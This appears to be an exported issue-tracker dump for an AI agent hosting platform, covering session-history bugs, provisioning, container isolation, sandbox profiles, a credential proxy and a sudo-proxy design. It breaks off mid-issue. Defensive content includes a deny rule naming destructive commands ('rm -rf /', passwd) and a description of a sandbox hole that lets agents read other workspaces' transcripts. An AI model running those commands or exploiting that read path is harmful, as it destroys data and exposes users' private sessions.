title: Design per-user and platform backup file tree
Fix intermittent disappearing user prompts in oqto frontend
description:
Implemented canonical session-ID persistence hardening for Pi JSONL imports to stop frontend history splits (messages present in JSONL but split across two oqto_log_sessions).

Root cause documented:
- duplicate oqto_log_sessions for same external_id (Pi session ID), e.g. one oqto-* platform session plus one legacy external-id session
- non-deterministic external_id lookup (`find_session_by_external ... LIMIT 1`) could pick the wrong row
- post-pass importer repair could write using mismatch session token directly, reintroducing split identity rows

Changes shipped:
1) backend/crates/oqto-history/src/oqto_log/ops.rs
   - `find_session_by_external` now deterministically picks canonical session:
     - prefer session_id==platform_id and `oqto-*`
     - then highest turn_count
     - then newest updated_at
   - added `list_sessions_by_external_in_workspace(...)`
   - added `delete_session_in_workspace(...)`

2) backend/crates/oqto/src/oqto_log/importer.rs
   - added `collapse_duplicate_external_sessions(...)` helper
   - after successful import/replace, collapse duplicate sessions for same external_id keeping canonical session only
   - fixed post-pass mismatch repair:
     - resolve mismatch token to canonical session/external IDs before replace
     - locate JSONL by resolved external ID
     - replace canonical session, then collapse duplicates

Validation:
- cargo fmt -p oqto -p oqto-history
- cargo check -p oqto-history -p oqto

Operational verification (2026-06-01):
- executed: `oqto runner migrate-oqto-log --mode bootstrap --workspace-root /home/wismut/byteowlz/oqto_refactor`
- output: scanned_files=2356, imported_sessions=38, imported_messages=1361, failed_files=0
- `/api/chat-history/{platform-id}/messages` now returns 160 messages for target session and `/api/chat-history/{external-id}/messages` resolves to the same canonical timeline (160)
- duplicate legacy external-id session row for target was removed from local oqto-log workspace DB during remediation

Expected effect:
- no more split timelines where frontend shows only subset of messages while Pi JSONL has full history
- existing duplicates are collapsed on import/repair passes
close_reason: Canonicalized external->platform resolution and collapsed duplicate oqto-log sessions during import/repair to prevent frontend message loss.

title: setup.sh: fix full user provisioning pipeline (pi, eavs, models, runner)
description:
setup.sh must correctly provision everything for a new platform user on a fresh install:

1. Pi installation: install pi-coding-agent system-wide with a bun wrapper that works for all users (not hardcoded to installer's HOME)
2. Eavs config: always generate proper config under oqto user with [keys] enabled, master key, and env file
3. Per-user provisioning on login/creation:
   - Generate eavs virtual key for the user
   - Write models.json to ~/.pi/agent/ (from eavs provider catalog)
   - Write settings.json with default provider/model
   - Install pi per-user or ensure system-wide pi works
4. Runner defaults: workspace_dir=~/oqto, pi_sessions=~/.pi/agent/sessions (already fixed in code)
5. Templates: clone to /usr/share/oqto/oqto-templates, chown to oqto user (already fixed)
6. Dotfiles: copy from templates/dotfiles/ to user home (already fixed in code)
7. Workspace creation: copy agents/main/ template including .pi/skills/, write .oqto/workspace.toml (already fixed in code)

Currently broken:
- Pi wrapper in /usr/local/bin/pi hardcodes installer's bun path
- Eavs config generation skipped if config file exists (stale config from previous install)
- No per-user eavs key or models.json provisioned during user creation
- Runner was looking in ~/projects instead of ~/oqto (fixed in code, not yet released)

All fixes should be in setup.sh so a single fresh run provisions everything correctly.

title: Bound file-tree traversal concurrency and add hard limits for huge repos
Reduce oqto cold-start time and add readiness-gated deploy sync-configs
description:
Observed on octo-azure: systemd reports oqto started, but admin unix socket (/run/oqto/oqtoctl.sock) and HTTP listener come up ~10s later. deploy sync-configs currently races this window, causing repeated 'Connection refused (os error 111)' on oqtoctl unix requests.

Evidence from logs:
- service started around 12:07:49
- admin socket + HTTP listener only at ~12:08:00
- sync_user_configs succeeds after readiness (~12:08:02)

Work items:
1) Add explicit readiness probe to deploy flow before running oqtoctl user sync-configs:
   - wait for oqtoctl socket existence and successful lightweight oqtoctl command
   - keep bounded retries + clear diagnostics
2) Profile and reduce oqto startup critical path:
   - identify which init steps run before bind/listen (cleanup, backfill, config loading, EAVS init, etc.)
   - move non-critical heavy tasks (e.g. session target backfill) to post-listen/background where safe
3) Add startup timing telemetry:
   - log stage durations and total time-to-ready (admin socket + HTTP)

Acceptance criteria:
- Deploy no longer emits connection-refused sync-configs errors on healthy restarts
- oqto logs include clear per-stage startup timings
- Time-to-ready reduced measurably on octo-azure (target <5s on warm restart unless migrations required)
- No behavior regressions for multi-user startup sequencing

title: Inject AGENT_CTX_* platform fields at the runner/backend env authority
description:
Per ADR-0013. Currently ZERO AGENT_CTX_* injected (only ad-hoc OQTO_SESSION_ID). The pi-env-ctx extension already owns harness-native fields and disclaims platform fields. Implement the runner half at the single-authority env builder (oqto/src/session/service.rs ~1927) + runner spawn (pi_manager.rs): PLATFORM_NAME, PLATFORM_VERSION, PLATFORM_SESSION_ID (supersedes OQTO_SESSION_ID), WORKSPACE_ID, WORKSPACE_PATH, USER_ID, RUN_MODE, baseline HARNESS. Shared dependency under the awareness plane, session artifacts, and activity heartbeats.

== IMPLEMENTED (pending build-lane gate) ==
inject_agent_ctx() in session/service.rs, called at both base_system_env authorities (start_local_mode create + resume_session_inner). Sets 7 certain fields: VERSION, PLATFORM_NAME, PLATFORM_VERSION, PLATFORM_SESSION_ID(=session.id), USER_ID, WORKSPACE_PATH, HARNESS(session.agent). Flows backend->runner.start_session(env)->cmd.envs->agent. Commit on main.
DEFERRED: WORKSPACE_ID (needs shared canonical oqto-log SHA-256-of-path helper, else joins break), RUN_MODE (ADR-0001 collapse). Container path skipped (dying).
NOT cargo-verified (harness cannot build git deps). NEXT: run 'just check' / 'cargo clippy -p oqto' / 'cargo test -p oqto' in a build lane (archvm); then this can close.
close_reason: Implemented inject_agent_ctx() at both env authorities (start_local_mode create + resume_session_inner) - both call runner.start_session(env) and the runner forwards env to the agent. Sets VERSION, PLATFORM_NAME, PLATFORM_VERSION, PLATFORM_SESSION_ID(=session.id, supersedes OQTO_SESSION_ID), USER_ID, WORKSPACE_PATH, HARNESS. GATE GREEN (sandbox now off): cargo check + clippy (no oqto warnings) + cargo test -p oqto --lib (242 incl 2 new unit tests) + cargo fmt --check + ast-grep guardrails (0 hits). Commits 186d7f6b (impl) + 8e8847f0 (tests). WORKSPACE_ID + RUN_MODE deferred -> oqto-jh6m.

title: Container-per-workspace placement: runner-in-container as a first-class Placement
description:
Make "each personal user or shared workspace runs as its own container with a runner inside it" a first-class Placement (NOT a backend runtime mode — ADR-0001). Decision records: docs/adr/0019-container-per-workspace-placement.md + docs/adr/0020-portability-oci-substrate-pluggable-supervisor.md.

Resolved design (grilled 2026-06-25):
- Workspace = Principal = container; Workspace = a Pod (runner container + shared infra wired as endpoints). 1 runner per Workspace. Personal default: 1 container per Account; shared: always its own container.
- Generalizes the existing shared-workspace seam (workspace_id -> dedicated Principal -> runner socket) to (Workspace -> container -> in-container runner via bind-mounted unix socket). Backend routing barely changes; placement invisible to protocol.
- Portability (ADR-0020): OCI substrate; pluggable Placement Supervisor; rootless podman PRIMARY on every OS (podman machine on Mac/Win); k8s + Docker + local-process as backends; systemd demoted to one backend.
- Drop host Linux users: isolation via container + per-Workspace userns subuid ranges; oqto-hostd shrinks to subuid-alloc + container start.
- Data: filesystem-as-truth, shared-nothing; per-Workspace volume holds oqto-log SQLite + mmry + files, single-writer-local; container = ephemeral compute, volume = durable truth.
- eavs: shared node/cluster service by default, wired as an egress endpoint; runner topology-agnostic; per-Workspace sidecar is opt-in only.
- Sandbox under in-container (reduced-cap) root: runner applies Landlock+seccomp before exec with NO_NEW_PRIVS (irrevocable even by root); no CAP_SYS_ADMIN; cross-tenant (userns) and intra-Workspace (landlock) are independent layers; capability advertisement + graceful degradation where Landlock absent.
- Operability is a first-class deliverable (labels + oqtoctl debug verbs + registry); transparency relocates host -> control plane.

Blocked on: oqto-3ct7.16 (PlacementStore contract), oqto-3ct7.15 (delete dead container/RuntimeMode code).
Downstream of: ADR-0018 / oqto-vemr.9 (complete prebuilt bundle feeds the per-Workspace image).

Open: remote reachability (dial-in), mount-source future types, resource governance.

title: Runner runs cleanly as a container entrypoint (PID1 signals + LISTEN_FDS socket activation)
description: oqto-runner must work as a container entrypoint: proper PID1/signal handling, accept inherited LISTEN_FDS for podman-quadlet socket activation, bind-mounted unix socket at the ADR-0002 path. Binary unchanged in behavior; just container-entrypoint-correct. ADR-0019 decision 3/consequences.

title: Code vocab rename: workspace_path -> work directory, SharedWorkspace -> Workspace
description: Reconcile code with the corrected glossary (CONTEXT.md): the code's workspace_path is a *work directory*; SharedWorkspace is a *Workspace*. Rename across oqto/src/runner, session models, shared_workspace, ws_multiplexed. Mechanical but wide; do alongside the placement extraction to avoid churning twice.

title: Pluggable Placement Supervisor contract + rootless-podman backend (primary)
description: Define the Placement Supervisor trait (start/stop/health/reach a runner at its placement) per ADR-0020, and implement the FIRST backend: rootless podman on Linux single-node (per-Workspace userns subuid ranges; bind-mounted runner socket; podman pod = Workspace). Core stays supervisor-agnostic. Later backends (k8s, Docker, local-process) implement the same trait. systemd demoted to one backend (amends ADR-0002). Validate the seam early with a second backend (local-process) so single-node assumptions don't leak into the contract.

title: Per-workspace container image built from the prebuilt bundle (runner + harness toolchain)
description: Build the per-Workspace container image from the ADR-0018 prebuilt bundle (no in-image compilation): runner + Pi + curated Oqto toolchain (dependencies.toml set + ripgrep/uv/typst). Fixed internal uid (oqto) under userns remap. This is the reviewed/reproducible base layer; runtime installs persist via the volume (nppq.5); system packages via a declarative per-Workspace manifest deriving an image layer. Downstream of oqto-vemr.9. Supersedes the all-in-one deploy/docker image for multi-tenant use.

title: Advertise placement: RunnerHello.placement + PlacementStore resolves host-vs-container per target
description: Add placement field to RunnerHello (oqto-protocol/src/runner.rs). PlacementStore (oqto-3ct7.16) resolves placement FOR an ExecutionTarget (host vs container vs pod) by workspace/user policy. ExecutionTarget enum unchanged; sessions stay placement-agnostic (no runner_id persisted). ADR-0019 decision 1+6.

title: Per-Workspace volume = durable source of truth (oqto-log SQLite + mmry + files) and tool persistence
description: Define the per-Workspace volume layout: oqto-log SQLite + mmry-core + work-dir files, single-writer-local (never shared/NFS), mounted into exactly one container. Container = ephemeral compute; volume = durable truth; snapshot = consistent Workspace backup. Volume-back user-space tool installs (~/.cargo, ~/.local, ~/.npm, venvs, mise/nix) so agent installs persist across restarts without image rebuild. Map ADR-0016 host layout (~/.pi JSONL — Pi owns these, sacred) into the volume. ADR-0019 data model + tool provisioning.

title: Drop host Linux users for container placement; shrink oqto-hostd to subuid-alloc + container start
description: For container placements, delete host login users as the isolation mechanism: remove useradd/home dirs/shells, sudoers entries, loginctl enable-linger, oqto-host/linux_users.rs, and oqto-hostd user-creation. Replace with per-Workspace userns subuid/subgid range allocation. oqto-hostd becomes 'allocate subuid range + start container'. Principal concept survives, realized as the container (amends ADR-0009). ADR-0019.

title: Portable feature-gated oqto-sandbox; runner-applied irrevocable Landlock+seccomp under reduced-cap root
description: Make oqto-sandbox portable + runtime-selecting (Linux Landlock/seccomp/namespaces; macOS seatbelt; Windows best-effort). Enforce the threat model: the RUNNER installs the sandbox before execve with NO_NEW_PRIVS; Landlock+seccomp are monotonic/irrevocable even for in-container root; container gets reduced-cap root (no CAP_SYS_ADMIN) so mount tricks can't sidestep. Two independent layers: userns=cross-tenant, landlock=intra-Workspace. Capability advertisement + graceful degradation where Landlock absent (run agent unprivileged or advertise reduced isolation). Ref agent-jail's 'strongest backend at runtime'. ADR-0019.

title: Operability: oqtoctl debug verbs + mandatory labels + Workspace->placement registry
description: First-class debug tooling so containerization doesn't regress operability. Mandatory labels (oqto.workspace, oqto.account, oqto.placement) on every container/volume. oqtoctl verbs: ws ls/ps/exec/logs/inspect/fs as thin label-driven wrappers over podman (kubectl later). podman unshare to read mapped subuids; podman exec as the new sudo -u. Logs always exported to oqto-log + host journal, never trapped in a container. Workspace->placement registry (PlacementStore) answers 'where is X'. ADR-0019 operability.

title: Typed mount-source for work directories (replace workspace_path: PathBuf); build local only
description: Model a work directory's backing store as a typed mount-source descriptor instead of assuming a host PathBuf (ADR-0020). Implement only 'local'/'bind' now; design the shape so future smb/SharePoint, object storage, gdrive (rclone single-node / CSI on k8s) slot in without retrofitting. Forward-compat hook; do not build remote sources yet.

title: Invalidate PI_MESSAGES_CACHE on agent.idle to prevent stale reads
description:
The get_messages handler in ws_multiplexed.rs uses a 15-minute TTL cache (PI_MESSAGES_CACHE). If a user opens a session (cache populated), agent runs and finishes, user switches away and back within 15 minutes -- the cache returns stale messages missing the latest agent response.

Current bypass: cache is skipped during active streaming (is_active check) and when age <= 2s. But sessions that become inactive between cache population and access serve stale data.

Fix: Invalidate the cache entry for a session whenever agent.idle is received for that session. This is a one-line change in the agent.idle event handler.

File: backend/crates/oqto/src/api/ws_multiplexed.rs: PI_MESSAGES_CACHE + agent event forwarding

title: Sandboxed builds pollute shared host target/ with nobody-owned files; extend overlay to build-output dirs
description:
Sandboxed agent builds write nobody-owned files into the shared host target/, breaking subsequent host AND agent builds. Recurs every sandboxed build.

== CURRENT BEHAVIOR (verified from code, oqto-sandbox/src/config.rs + oqto-runner/src/pi_manager.rs + spawn.rs) ==
1. Cache + build dirs are raw rw bind-throughs to the REAL host paths: ~/.cargo etc. are in allow_write -> rw --bind; workspace is '--bind workspace workspace' (config.rs:1601) and target/ lives inside it. overlay_enabled=false in ALL profiles (555/622/688). No overlay, no redirect -> agent build and host build write the SAME physical files.
2. bwrap gets NO explicit uid map: grep for setuid/seteuid/--uid/--gid/runuser in the bwrap spawn path is EMPTY. --unshare-user is emitted only when disable_userns=true (development, strict; config.rs:1880-1883); minimal gets no userns. With --unshare-user and no --uid, bwrap uses its default single-entry map (spawning euid -> same uid in-ns); every other in-ns uid resolves to the host overflow uid = nobody (65534).
3. So ownership of writes is unmanaged: writes under the one mapped uid are owned correctly; writes under any other in-ns uid land as nobody. Runner can operate euid 0 (egress.rs:334) and there is NO drop to the workspace owner before the build, so the map covers one identity while writes occur under another -> nobody on host.
LIMIT: exact uid attribution (why nobody vs runner-user) needs a live 'cat /proc/<build-pid>/uid_map' during repro; the three facts above are code-verified. Net: today there is NEITHER isolation NOR uid management on cache/build writes.

== WHY OVERLAY (not chmod, not uid-only) ==
COW overlay read-shares the host cache (fast) while writes go to a private upper layer (zero host pollution) AND is concurrency-safe (two builders in one target/ race on fingerprints/locks even with correct uids). 'chmod-wide' fails: doesn't fix ownership (userns, not mode), doesn't fix concurrency, and opens a cache-poisoning / cross-tenant write channel (agents write each other's/your ~/.cargo). Overlay is already IMPLEMENTED (config.rs ~1714-1774: per-workspace upper/work, bwrap --overlay-src/--overlay), gated by overlay_enabled.

== THE GAP ==
overlay_paths covers only package caches (~/.cargo,~/.npm,~/.bun,~/.local/share/uv,~/.cache/uv), NOT the workspace target/ (which lives in the rw workspace bind). Enabling overlay alone does NOT fix this.

== FIX ==
Extend overlay coverage to build-output dirs (rust target/, node build artifacts) as a subdir overlay ON TOP OF the rw workspace, so source round-trips rw while build output is COW-isolated; enable in profiles. Consequence: agent build output ephemeral (per-session upper) - acceptable; deliverables go via explicit output paths. Add GC for ~/.oqto/overlays upper dirs. Needs repro + real sandbox testing (cannot build in Claude Code harness).
SINGLE-USER ALTERNATIVE: for personal/non-concurrent boxes, fixing the bwrap uid map so writes round-trip to the workspace owner gives a shared+persistent+correctly-owned cache without overlay's ephemerality. Pick per-profile: uid-map for personal, overlay for team/multi-user. Related: oqto-b4za (closed, uid_map/Landlock ordering).

== PERFORMANCE PROFILE (overlay) ==
RAM: flat/negligible. bwrap --overlay is kernel overlayfs; upper/work live on overlay_root=~/.oqto/overlays (config.rs:135), regular DISK not tmpfs -> no RAM-backed storage. Only cost is small kernel inode/dentry metadata for the merged view. Lower-layer reads share the host page cache (no double-caching). RULE: never put overlay_root on tmpfs or RAM cost becomes real.
CPU: small, usually unnoticeable. (a) thin per-path lookup (check upper then lower) - single-digit % at worst on metadata-heavy build workloads; (b) copy-up only when MODIFYING a file that exists in the lower layer - mostly N/A here since ~/.cargo is read-mostly and new build artifacts are created directly in upper (no copy-up).
DISK: the real cost. Each session's upper layer accumulates that session's build output (a Rust target/ is GBs); one overlay per sandbox session. ~/.oqto/overlays grows fast without GC. Concurrent builds multiply DISK, not RAM. Size GC + disk budget accordingly (this is what the GC requirement above is for).

title: Fix pi-read-image-guard resizer import in sandboxed/global runtime
Sandbox profile hierarchy: strict/development/privileged/godmode
description:
Implement four-tier profile hierarchy for sandbox configuration.

- strict: overlay isolation, deny secrets, network isolated, seccomp+landlock enforce.
- development: overlay isolation, deny secrets, network open, seccomp+landlock audit.
- privileged: no overlay, full home write, deny secrets, no seccomp/landlock.
- godmode: no sandbox at all, full access (explicit opt-in only, user/system config, not workspace).

Godmode constraints:
- Cannot be set via workspace .oqto/sandbox.toml (only user or system config).
- Audited and logged.
- Cannot be set by agent itself.

title: setup.sh must guarantee hstry is running and accessible for every provisioned user
description:
Production shows 500 on /api/chat-history with 'Chat history service not configured for this user.' for wismut-vCmT. Root cause: get_runner_for_user() returns None in multi-user mode, which is a hard error. The setup process needs to:

1. Verify hstry binary is installed and accessible
2. Verify per-user hstry config exists (~/.config/hstry/config.toml)
3. Verify per-user systemd service is created, enabled, and started
4. Verify hstry is actually listening (health check)
5. Add a `just admin-health` or `oqto-admin health --all` command that checks all users' services
6. setup.sh should fail if any of these steps fail, not silently continue

The usermgr creates service files but doesn't verify the service actually starts successfully. The runner service has Wants= (not Requires=) on hstry, so it can start even if hstry fails.

title: Credential proxy on oqto-runner: secret-aware API proxying via kyz
description:
## Summary

Add a credential proxy endpoint to oqto-runner. When an agent needs to make an authenticated API call, it hits the runner's `/v1/proxy` endpoint with a kyz secret reference. The runner resolves the credential from the user's kyz vault, injects it into the outbound HTTP request, and returns only the API response. The agent never sees plaintext credentials.

## Why runner, not eavs

- eavs is a shared central service -- it doesn't have access to per-user kyz vaults
- The runner already runs as the target user and can access their vault
- The runner already mediates between agent and outside world
- Clean separation: eavs = LLM proxy (shared), runner = credential proxy (per-user)

## Multi-Runner / Multi-Workspace Architecture

Each user can have multiple runners (private workspace, shared workspace, remote workspace). Credential resolution uses kyz's existing vault discovery with a layered model:

```
Runner for workspace X:
  1. Workspace vault:  <workspace>/.kyz/vault.json   (project-scoped secrets)
  2. Central vault:    ~/.local/share/kyz/vault.json  (user-wide secrets)
  
Lookup: workspace first, central fallback
```

### Scenario Matrix

| Runner Type | Workspace Vault | Central Vault | Notes |
|-------------|----------------|---------------|-------|
| Private workspace (local) | project secrets (deploy keys, API keys) | personal secrets (GitHub token) | Both available, standard kyz resolution |
| Shared workspace (local) | shared project secrets (team deploy key) | personal secrets | Workspace vault is shared across users; user's central vault provides personal creds |
| Remote workspace | project secrets (bundled with workspace) | NOT locally available | Either self-contained workspace vault or remote kyz-api call |

### Shared Workspace Credentials

A shared workspace `.kyz/vault.json` is encrypted with a shared passphrase that team members know. It holds project-level secrets (deploy keys, CI tokens, shared API keys). Personal credentials come from each user's central vault.

The runner resolves in order:
1. Check workspace vault for the requested credential
2. If not found, check user's central vault
3. If not found, return 404 to agent

This means a team can store `stripe/api-key` in the workspace vault and each developer's personal `github/token` lives in their central vault. Both are available through the same `/v1/proxy` endpoint.

### Remote Workspaces

When the runner is on a remote machine, the user's central vault isn't available locally. Options:

**Option A: Self-contained workspace vault** (simplest)
- All needed secrets stored in the workspace vault
- Workspace is rsynced/cloned to remote including `.kyz/`
- No dependency on central vault
- Limitation: personal secrets must be duplicated per-workspace

**Option B: kyz-api as remote vault backend** (future)
- User's main machine runs kyz-api (or the oqto backend proxies vault requests)
- Remote runner calls kyz-api over authenticated channel for central vault lookups
- Workspace vault still local, central vault remote
- Requires kyz-api to support authenticated remote access

**Option C: Vault sync** (future)  
- Central vault synced to remote on workspace setup
- Runner uses local copy
- Requires secure sync mechanism + conflict resolution

Recommend: Start with Option A (self-contained workspace vaults). Add Option B when remote workspaces are a priority.

## Runner Proxy API

### POST /v1/proxy -- Make an authenticated API call

```json
{
  "url": "https://api.stripe.com/v1/charges",
  "method": "POST",
  "headers": {"Content-Type": "application/json"},
  "body": {"amount": 2000, "currency": "usd"},
  "credential": {
    "ref": "stripe/api-key/value",
    "inject": "bearer"
  }
}
```

Response: upstream response passed through (status, headers, body). Secret never in response.

### GET /v1/credentials -- List available credentials (metadata only)

Returns merged view from workspace + central vault:

```json
[
  {"service": "stripe", "key": "api-key", "fields": ["value"], "source": "workspace", "pinned_hosts": ["api.stripe.com"]},
  {"service": "github", "key": "deploy", "fields": ["token"], "source": "central", "pinned_hosts": ["api.github.com"]}
]
```

### Credential Injection Styles

| Style | What runner does |
|-------|-----------------|
| `bearer` | `Authorization: Bearer <secret>` |
| `basic` | `Authorization: Basic base64(user:secret)` |
| `header:X-Api-Key` | `X-Api-Key: <secret>` |
| `query:api_key` | Appends `?api_key=<secret>` to URL |
| `body:api_key` | Merges into JSON body |

## Security

- Secret values structurally cannot appear in proxy responses
- **Host pinning**: credentials pinned to allowed hosts (configurable per-secret metadata)
- **SSRF protection**: block private IP targets, strip auth headers on redirects
- **Audit log**: JSONL -- timestamp, session ID, target URL, credential ref, HTTP status (never values)
- **Rate limiting**: per-credential configurable
- **Vault isolation**: workspace vault secrets don't leak to other workspaces; central vault is user-private

## Integration

- Runner already has a Unix/TCP socket to the agent
- Add `/v1/proxy` and `/v1/credentials` routes
- Runner injects `CREDENTIAL_PROXY_URL` env var into agent sessions
- Runner manages vault session lifecycle (unlock on runner start, lock on stop)
- Pi skill wraps the proxy call for ergonomic agent use

## Dependencies

- kyz-core as a library dependency (VaultStore, SecretStore trait)
- Runner needs access to user's kyz vault (already runs as user)
- Vault must be unlocked (runner manages session lifecycle)

## Related

- eavs-sth0 (original issue, redirected here)
- kyz vault resolution already supports workspace + central fallback

title: Implement graceful shutdown for oqto updates and restarts
description:
Currently, oqto lacks graceful shutdown for sessions during updates. When restarting oqto or oqto-runner, all agent sessions are terminated with SIGKILL, which abruptly interrupts active agent work.

**Problem:**
- Sessions receive SIGKILL (no SIGTERM, no wait period)
- Active LLM responses are interrupted mid-stream
- No session drain mode to wait for in-progress work to complete
- Users must manually resume all sessions after restart

**Impact:**
- Data loss for in-progress agent responses
- Poor user experience during updates
- Cannot safely update when users have active sessions
- Requires coordination to avoid interrupting work

**Proposed Solution:**
1. Implement graceful shutdown sequence:
   - Send SIGTERM to session processes
   - Wait configurable timeout (e.g., 30s) for clean exit
   - Escalate to SIGKILL only after timeout

2. Add session drain mode:
   - New CLI flag: oqto serve --drain-mode
   - Reject new session creation
   - Wait for existing sessions to become idle
   - Allow admins to check remaining active sessions

3. Update helper script:
   - Update fast-reload.sh to use graceful shutdown
   - Add --force flag to skip graceful shutdown
   - Show session count and status during drain

4. Add update readiness endpoints:
   - GET /api/admin/ready-to-update returns session count
   - POST /api/admin/drain-sessions initiates drain mode
   - POST /api/admin/abort-update cancels drain mode

**Files to modify:**
- backend/crates/oqto/src/local/process.rs - implement graceful kill()
- backend/crates/oqto/src/main.rs - handle signals and drain mode
- scripts/fast-reload.sh - use graceful shutdown
- backend/crates/oqto/src/api/handlers/admin.rs - add admin endpoints

title: INSTRUCTIONS.md auto-renders as pinned first assistant message in workdir chats
description:
When an INSTRUCTIONS.md file is present in the root of an oqto workdir, the frontend reads its contents and renders it as a pinned 'first assistant message' at the top of every chat session in that workdir.

Scope (MVP):
- Pure frontend: read via existing mux-files channel (readFileMux), render via existing MarkdownRenderer
- Always pinned at top of every chat (new or with history), so teammates joining a shared workspace mid-session see it
- Small unobtrusive marker (e.g. 'Pinned from INSTRUCTIONS.md') so it is not mistaken for a real agent message
- NOT sent to the agent as context (Pi already handles AGENTS.md). This is human-visible only.
- NOT persisted to oqto-log/hstry. Purely a UI rendering of the file on disk.
- Reads on session/workspace mount and on file change events (if cheap)

Out of scope (future):
- Custom HTML render support (track in a follow-up issue)
- Editor UI for INSTRUCTIONS.md (users can edit the file via existing file actions for now)

Use case: leave notes for yourself or teammates in shared workspaces, e.g. project conventions, links to dashboards, current focus areas.
close_reason: Implemented as pinned, collapsible first-assistant card sourced from INSTRUCTIONS.md at workdir root. Pure frontend (readFileMux + MarkdownRenderer); not sent to agent, not persisted to oqto-log/hstry. Live updates via watchFilesMux + file_changed (with auto-rewatch if another component unwatches the shared backend watcher). Collapse state persisted per workspace in localStorage. Files: frontend/hooks/use-workspace-instructions.ts, frontend/features/chat/components/InstructionsPinnedMessage.tsx, ChatView.tsx wiring. Security audit done — see oqto-yf27 for residual shared-workspace privacy hardening.

title: Fix deployed runner using broken system Pi wrapper
description: Root cause confirmed: oqto-runner resolved /usr/local/bin/pi (v0.70.5). That system wrapper exits immediately because /usr/local/lib/pi-coding-agent/node_modules/@mariozechner/pi-coding-agent self-link is missing, causing extension load failure. Runner then logs stdout reader finished and failed to write command: Broken pipe, so UI prompts appear accepted by oqto but never reach a live Pi process. Immediate mitigation applied on arch-dev-01: set ~/.config/oqto/config.toml [pi].executable to /home/wismut/.bun/bin/pi (v0.70.6) and restarted oqto-runner. Long-term fix: setup/deploy must validate/repair system Pi wrapper install or resolver must prefer a working user Pi when system Pi fails health check.
close_reason: Fixed properly: oqto-runner now resolves Pi from a candidate list and requires a --mode rpc smoke test before selecting a binary, so a broken /usr/local/bin/pi is skipped in favor of a working user Pi. Setup now runs the same RPC smoke test after installing the system Pi wrapper/self-link, failing fast if extensions cannot resolve the host package. just lint and cargo test -p oqto-runner pass.

title: Sandbox grants cross-workspace read on harness session dirs (~/.pi, ~/.claude, ~/.codex)
description:
## Problem
Any sandboxed agent can read every session transcript across ALL workspaces (and other harnesses) regardless of profile. This violates the oqto-log access model ("scope derived from oqto-sandbox read permissions; no raw cross-workspace reads").

## Evidence (backend/crates/oqto-sandbox/src/config.rs)
- minimal: deny_read = ssh/gnupg/aws/systemctl only; ~/.pi unrestricted.
- development (default): ~/.pi, ~/.claude, ~/.local/share/claude, ~/.codex, ~/.local/share/codex all in allow_write (=> readable). lines ~466-475.
- strict: ~/.pi in allow_write (line ~548); deny_read covers ~/.config but not session dirs.
- spawn.rs: `_workspace: &Path` param is UNUSED (lines 26, 76) -> zero per-workspace session-dir scoping exists.

Net: an agent in workspace A can read `~/.pi/agent/sessions/--{other_workspace}--/*.jsonl` for every other project, plus Claude/Codex history. A duckdb one-liner slurps the entire corpus.

## Root cause
Harnesses must WRITE their own session files (Pi: ~/.pi/agent/sessions/--{safe_cwd}--/), so the home dir is granted writable+readable wholesale. No mechanism scopes reads to the current workspace's session subdir.

## Fix (dynamic, spawn-time; depends on cwd so not a static profile)
1. blanket deny_read on ~/.pi/agent/sessions (tmpfs mount).
2. rw-bind back ONLY the current workspace's `--{safe_cwd}--` subdir (Pi needs write).
   Mechanism already exists: strict re-binds ~/.config/oqto via extra_ro_bind AFTER the deny_read tmpfs (config.rs line ~561). Same layering.
3. Wire the unused `_workspace` param in spawn.rs to compute safe_cwd and inject the bind.
4. Generalize to ~/.claude and ~/.codex session/history dirs.

## Granularity
- Default: workspace-scoped (whole --safe_cwd-- subdir) -> maps to oqto-log Workspace scope.
- strict: session-file-only.

## Notes
- Found while building operator analytics CLI (~/scripts/bash/pi-sessions, trx oqto-qjcy). That tool is operator-only and intentionally NOT exposed to agents.
- Agent-facing session search is the correct path and already partly built (oqto-log FTS5 search_timeline); see epic oqto-2hyk.
- Add a regression test: agent in workspace A cannot read workspace B's session JSONL.

DuckDB over Pi JSONL: summary/cost/tools/projects/daily/top/hours/cache + sql escape hatch, auto-refreshing parquet cache at ~/.cache/pi-sessions/ev.parquet. Reframed away from agent skill: agent-facing session search must use runner-mediated oqto-log (scope=sandbox read perms), already covered by epic oqto-2hyk. Raw-JSONL analytics is operator/personal only. Separate finding: all sandbox profiles grant cross-workspace read on ~/.pi (and ~/.claude/~/.codex) session dirs; spawn.rs _workspace unused -> no per-workspace scoping. Needs its own security trx.

title: Runner-mediated privileged operations (sudo proxy)
description:
Agents cannot have sudo/root inside the sandbox (by design: no_new_privs + bwrap). Instead, privileged operations are mediated through the runner using the same approval/lease model as SSH and secrets.

Goals
- Agent can request privileged operations without holding real sudo.
- Runner executes outside sandbox after user approval.
- Result piped back to agent transparently.
- Full audit trail of privileged operations.

Scope
1) Privileged operation wrapper (sudo shim)
   - Intercepts sudo/pkexec calls inside sandbox.
   - Routes to runner as structured capability request.
   - Agent sees normal command output.

2) Operation categories and risk tiers
   - Low: package install (apt/pacman/brew), read system info.
   - Medium: service restart, port binding, device access.
   - High: write to /etc, modify system config, user management.

3) Approval model (reuses kyz lease engine)
   - Per-command, per-session, or TTL-based approvals.
   - Risk-tiered prompts (low=auto+audit, high=explicit).
   - Presets for common patterns (e.g. allow apt install for session).

4) Runner execution path
   - Runner validates request against policy.
   - Executes command outside sandbox with real privileges.
   - Streams stdout/stderr back to agent.
   - Logs operation with full context.

5) Safety constraints
   - Allowlist of mediated commands (not arbitrary sudo).
   - Deny dangerous operations by default (rm -rf /, passwd, etc.).
   - Max privilege scope per session.
   - Cannot modify sandbox config or runner config.

Definition of done
- Agent can run apt install / systemctl restart via mediated path.
- User gets clear approval prompt with risk tier.
- Runner executes privileged op and pipes result back.
- All privileged operations are auditable and revocable.
- Dangerous operations are denied by default.

title: Sudo shim: intercept sudo calls and route to runner
description: Create a sudo wrapper binary that sits in sandbox PATH before real sudo. Intercepts command, sends structured request to runner via socket, streams result back. Agent sees normal sudo behavior.

title: Privileged operation policy engine with risk tiers
description: Define operation categories (package install, service restart, config write, etc.) with risk tiers. Implement policy evaluation that determines approval requirements per operation. Integrates with kyz lease model.

title: Runner privileged execution path
description: Runner-side handler that receives privileged operation requests, validates against policy, executes outside sandbox with real privileges, and streams stdout/stderr back to the requesting agent process.

title: kyz resolver integration in oqto-runner
Message rating and annotation system for DSPy/GEPA training data
description:
## Goal

Add thumbs-up/down ratings plus free-text annotations and tags to every assistant
message in oqto. Export the corpus as DSPy-ready JSONL so we can feed it into
GEPA optimization for our local Qwen3.6-35B models. This is a data-flywheel
feature: every rating should make future agent outputs smarter.

## Critical design decision (resolve FIRST, before any implementation)

